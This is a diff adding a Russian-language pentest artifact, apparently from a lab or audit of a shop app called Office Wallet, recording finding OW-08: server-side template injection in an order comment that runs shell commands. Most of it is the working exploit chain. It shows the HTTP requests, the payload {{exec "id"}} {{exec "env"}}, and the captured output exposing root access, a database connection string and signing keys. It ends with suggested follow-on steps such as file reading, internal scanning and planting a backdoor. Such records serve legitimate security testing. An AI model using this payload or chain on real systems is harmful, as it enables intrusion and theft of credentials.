@@ -1,0 +1,31 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-08
+################################################################################################
+== 2. OW-08: RCE: комментарий к заказу исполняется как shell-команда ==
+    · Комментарий к заказу (item_comment) подставляется в исходник text/template,
+    · в котором объявлена функция exec — она вызывает sh -c (handlers_shop.go:388-420).
+    · Проверки, что заказ принадлежит текущему пользователю, нет, поэтому хватает
+    · любой учётки. Контейнер приложения работает от root, значит внутри — всё.
+    → POST /cart/add  product_id=1 (товар за 450₽)
+    ← HTTP 302 redirect=http://localhost:18081/cart  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Корзина · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → POST /checkout/quote  item_comment={{exec "id"}} {{exec "hostname"}} {{exec "env"}}
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Подтверждение оплаты · Office Wallet</title>   <link rel="preconnect" href="https://fonts.goog...
+    → POST /checkout/confirm  quote_id=152
+    ← HTTP 302 redirect=http://localhost:18081/orders/208  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Заказ · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com">   ...
+[+] заказ #208 создан, комментарий сохранён в заказ
+    · открываем превью чека — шаблон с нашим комментарием выполняется:
+    → GET /orders/208/preview?renderer=classic  (item_comment → sh -c)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Превью чека · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.co...
+    Чек: uid=0(root) gid=0(root) groups=0(root) 4a1860a837ac DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable
+    PAYMENT_KEY=office-wallet-pay-key
+    SESSION_KEY=office-wallet-session-key
+    ┌─ АРТЕФАКТ · OW-08 · команда выполнена на сервере
+    │ GET /orders/208/preview → HTTP 200
+    │ Чек: uid=0(root) gid=0(root) groups=0(root) 4a1860a837ac DATABASE_URL=postgres://wallet:wallet@db:5432/wallet?sslmode=disable
+    │ PAYMENT_KEY=office-wallet-pay-key
+    │ SESSION_KEY=office-wallet-session-key
+    └─
+[+] uid=0(root) — root в контейнере; ключи подписей и DSN базы в том же выводе.
+    · Дальше в этой же оболочке: чтение любых файлов, сеть внутри кластера,
+    · сканирование, закладка в /app/exports для /ops/journal.
